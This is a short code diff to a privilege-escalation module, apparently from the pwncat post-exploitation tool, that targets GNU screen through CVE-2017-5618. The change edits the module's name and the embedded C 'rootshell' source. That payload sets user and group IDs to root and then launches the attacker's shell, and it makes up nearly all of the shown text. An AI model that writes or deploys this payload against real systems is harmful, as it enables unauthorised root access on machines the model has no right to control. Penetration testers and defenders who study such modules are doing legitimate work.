@@ -24,7 +24,7 @@ from pwncat import util
 
 class ScreenMethod(Method):
 
-    name = "screen CVE-2017-5618"
+    name = "screen (CVE-2017-5618)"
     BINARIES = ["cc", "screen"]
 
     def __init__(self, pty: "pwncat.pty.PtyHandler"):
@@ -113,15 +113,15 @@ class ScreenMethod(Method):
             writer.write_file(
                 rootshell_c,
                 textwrap.dedent(
-                    """
+                    f"""
                 #include <stdio.h>
-                int main(void){
+                int main(void){{
                     setuid(0);
                     setgid(0);
                     seteuid(0);
                     setegid(0);
-                    execvp("/bin/sh", NULL, NULL);
-                }
+                    execvp("{self.pty.shell}", NULL, NULL);
+                }}
                 """
                 ).lstrip(),
             )
